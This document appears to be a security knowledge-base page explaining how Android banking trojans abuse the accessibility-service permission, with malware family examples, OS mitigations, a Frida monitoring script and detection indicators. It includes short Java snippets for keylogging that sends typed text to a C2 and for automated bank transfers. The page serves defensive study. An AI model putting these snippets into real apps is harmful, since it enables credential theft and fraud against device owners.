# BIND_ACCESSIBILITY_SERVICE

The single most powerful permission in Android malware. An accessibility service can observe and interact with every element on screen, read notifications, perform gestures, and type text into any field. Modern banking trojans treat this as the primary goal -- once granted, full device takeover is possible without any other permission.

## Technical Details

| Attribute | Value |
|-----------|-------|
| Permission | `android.permission.BIND_ACCESSIBILITY_SERVICE` |
| Protection Level | `signature` |
| Grant Method | Settings > Accessibility > toggle on |
| Introduced | API 16 (Android 4.1) |
| MITRE ATT&CK | [T1453 - Abuse Accessibility Features](https://attack.mitre.org/techniques/T1453/) |

The `signature` protection level means only the system can bind to an accessibility service. The app declares the service in its manifest; the user enables it manually through system settings. No runtime permission dialog appears. Android shows a full-screen warning explaining the access being granted, but malware relies on social engineering overlays to rush users past this screen.

## What It Enables

An accessibility service receives `AccessibilityEvent` callbacks and can use `AccessibilityNodeInfo` to traverse and interact with the UI tree of any foreground app.

### Capabilities

| Capability | API | Offensive Impact |
|-----------|-----|--------|
| Read screen content | `AccessibilityNodeInfo.getText()` | Keylogging, credential theft |
| Perform clicks | `performAction(ACTION_CLICK)` | Auto-grant permissions, confirm installs |
| Perform gestures | `GestureDescription` (API 24+) | Swipe, scroll, interact with any UI |
| Fill text fields | `Bundle(ACTION_SET_TEXT)` | Inject text into any input |
| Read notifications | `FLAG_RETRIEVE_INTERACTIVE_WINDOWS` | OTP interception |
| Capture screen | `takeScreenshot()` (API 30+) | Screenshot any app including FLAG_SECURE |
| Control display | `GLOBAL_ACTION_LOCK_SCREEN` (API 28+) | Lock screen to hide activity |
| Enumerate windows | `getWindows()` | Detect which app is in foreground |
| Global actions | `performGlobalAction()` | Press Back, Home, Recents, open notifications |

### Effective Permission Escalation

With accessibility alone, malware can:

- Grant itself other permissions by navigating to Settings > Apps and clicking "Allow"
- Install additional APKs by clicking through install dialogs
- Disable Play Protect by navigating to Play Store settings
- Prevent its own uninstall by detecting Settings navigation and pressing Back/Home
- Perform on-device fraud (ODF) by operating banking apps directly
- Read encrypted messages from WhatsApp, Telegram, and Signal by capturing content after decryption on screen, as demonstrated by [Sturnus](https://www.threatfabric.com/blogs/sturnus-banking-trojan-bypassing-whatsapp-telegram-and-signal)
- Bypass FLAG_SECURE protections by using `AccessibilityNodeInfo` to read the UI tree rather than taking screenshots

### Keylogging via Accessibility

```java
@Override
public void onAccessibilityEvent(AccessibilityEvent event) {
    if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
        CharSequence text = event.getText().toString();
        String pkg = event.getPackageName().toString();
        sendToC2(pkg, text);
    }
}
```

### Automated Transfer System (ATS) via Accessibility

```java
AccessibilityNodeInfo amountField = findNodeByViewId("com.bank.app:id/amount");
Bundle args = new Bundle();
args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, "5000");
amountField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);

AccessibilityNodeInfo confirmBtn = findNodeByViewId("com.bank.app:id/confirm");
confirmBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
```

## Abuse in Malware

Nearly every modern Android banking trojan requires accessibility. The typical flow:

1. App installed (sideloaded or via dropper on Play Store)
2. Social engineering overlay prompts user to enable accessibility
3. Once enabled, malware auto-grants itself remaining permissions
4. Malware operates autonomously: overlay attacks, OTP interception, automated transactions

### Notable Families

| Family | Accessibility Usage | Source |
|--------|-------------------|--------|
| [Anatsa](../../malware/families/anatsa.md) (TeaBot) | Auto-grants permissions, performs [ATS](../../attacks/automated-transfer-systems.md) fraud | [ThreatFabric](https://www.threatfabric.com/blogs/anatsa-trojan-returns-targeting-europe-and-expanding-its-reach) |
| [Cerberus](../../malware/families/cerberus.md) / [Alien](../../malware/families/alien.md) | Overlay injection, keylogging, OTP theft, anti-uninstall | [ThreatFabric](https://www.threatfabric.com/blogs/cerberus-a-new-banking-trojan-from-the-underworld) |
| [Crocodilus](../../malware/families/crocodilus.md) | Black screen overlay to hide actions, Google Authenticator scraping | [ThreatFabric](https://www.threatfabric.com/blogs/exposing-crocodilus-new-device-takeover-malware-targeting-android-devices) |
| [Sturnus](../../malware/families/sturnus.md) | Reads encrypted messaging apps via UI tree, bypasses E2E encryption | [ThreatFabric](https://www.threatfabric.com/blogs/sturnus-banking-trojan-bypassing-whatsapp-telegram-and-signal) |
| [Herodotus](../../malware/families/herodotus.md) | Human-like typing delays to evade fraud detection timing analysis | [ThreatFabric](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection) |
| [SharkBot](../../malware/families/sharkbot.md) | ATS fraud via accessibility, auto-fills transfer details | [Cleafy](https://www.cleafy.com/cleafy-labs/sharkbot-a-new-generation-android-banking-trojan-being-distributed-on-google-play-store) |
| [Joker](../../malware/families/joker.md) | Auto-subscribes to premium services by clicking through WAP billing | [Google](https://security.googleblog.com/2020/01/pha-family-highlights-joker.html) |
| [Xenomorph](../../malware/families/xenomorph.md) | Overlay + accessibility for complete ATS chain | [ThreatFabric](https://www.threatfabric.com/blogs/xenomorph) |
| [Hook](../../malware/families/hook.md) | VNC-like remote access built on accessibility events | [ThreatFabric](https://www.threatfabric.com/blogs/hook-a-new-ermac-fork-with-rat-capabilities) |
| [TrickMo](../../malware/families/trickmo.md) | Fake lock screen overlay to steal device PIN/pattern | [Cleafy](https://www.cleafy.com/cleafy-labs/a-new-trickmo-saga-from-banking-trojan-to-victims-data-leak) |
| [RatOn](../../malware/families/raton.md) | Three-stage loader with NFC relay (Ghost Tap) capability | [ThreatFabric](https://www.threatfabric.com/blogs) |
| [Klopatra](../../malware/families/klopatra.md) | Hidden VNC for remote device control via accessibility | [Cleafy](https://www.cleafy.com/cleafy-labs) |
| [Medusa](../../malware/families/medusa.md) (TangleBot) | Full RAT capabilities, screen streaming | [ThreatFabric](https://www.threatfabric.com/blogs/the-rage-of-the-medusa) |

## Android Version Changes

**Android 7 (API 24)**: `GestureDescription` API added, enabling gesture-based interaction beyond simple clicks. This expanded what accessibility malware could do from tap-only to full swipe/scroll/drag operations.

**Android 11 (API 30)**: Restricted which apps appear in accessibility settings for apps targeting API 30+. Apps must declare `isAccessibilityTool="true"` in metadata or their service is hidden. Sideloaded apps targeting older APIs bypass this.

**Android 13 (API 33)**: [Restricted settings](https://support.google.com/android/answer/12623953) introduced. Apps installed from outside recognized app stores cannot navigate users to accessibility settings. The system blocks the intent and shows a "Restricted setting" dialog. Bypassed by session-based installers (the [SecuriDropper](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions) technique) or targeting API < 33.

**Android 14 (API 34)**: Added `ACCESSIBILITY_DATA_PRIVATE_YES` attribute allowing apps like [Google Authenticator to prevent non-accessibility-tools from reading 2FA codes](https://www.esper.io/blog/android-14-accessibility-security-feature) via the UI tree.

**Android 15 (API 35)**: [Enhanced Confirmation Mode](https://www.androidauthority.com/android-15-enhanced-confirmation-mode-3436697/) replaces Restricted Settings. Instead of checking which installation API was used, ECM checks a system-level allowlist preloaded in the factory image at `/system/etc/sysconfig`. This closes the session-based installer bypass that malware exploited since Android 13.

## Frida Monitoring Script

```javascript
Java.perform(function() {
    var AccessibilityService = Java.use("android.accessibilityservice.AccessibilityService");

    AccessibilityService.onAccessibilityEvent.implementation = function(event) {
        var eventType = event.getEventType();
        var pkg = event.getPackageName();
        var text = event.getText();
        console.log("[A11y] type=" + eventType + " pkg=" + pkg + " text=" + text);
        this.onAccessibilityEvent(event);
    };

    var AccessibilityNodeInfo = Java.use("android.view.accessibility.AccessibilityNodeInfo");

    AccessibilityNodeInfo.performAction.overload("int").implementation = function(action) {
        console.log("[A11y] performAction: " + action + " on " + this.getClassName());
        return this.performAction(action);
    };

    AccessibilityNodeInfo.performAction.overload("int", "android.os.Bundle").implementation = function(action, args) {
        console.log("[A11y] performAction: " + action + " args=" + args + " on " + this.getClassName());
        return this.performAction(action, args);
    };
});
```

## Detection

### Manifest Indicators

```xml
<service
    android:name=".MyAccessibilityService"
    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
    <intent-filter>
        <action android:name="android.accessibilityservice.AccessibilityService" />
    </intent-filter>
    <meta-data
        android:name="android.accessibilityservice"
        android:resource="@xml/accessibility_config" />
</service>
```

### Accessibility Config Red Flags

```xml
<accessibility-service
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:canRetrieveWindowContent="true"
    android:canPerformGestures="true"
    android:accessibilityFlags="flagRetrieveInteractiveWindows" />
```

Key indicators: `typeAllMask` event types, `canRetrieveWindowContent`, `canPerformGestures`, `flagRetrieveInteractiveWindows`. Legitimate accessibility tools (screen readers, switch access) typically scope to specific event types and do not request gesture capabilities.

### YARA Indicators

Look for the combination of:

- `BIND_ACCESSIBILITY_SERVICE` in manifest
- `typeAllMask` or `typeWindowStateChanged|typeWindowContentChanged` in accessibility config
- `canRetrieveWindowContent="true"` and `canPerformGestures="true"` together
- References to `UsageStatsManager` or `getRunningTasks` (foreground app detection)
- Accessibility service class containing `performAction`, `ACTION_SET_TEXT`, or `GestureDescription`
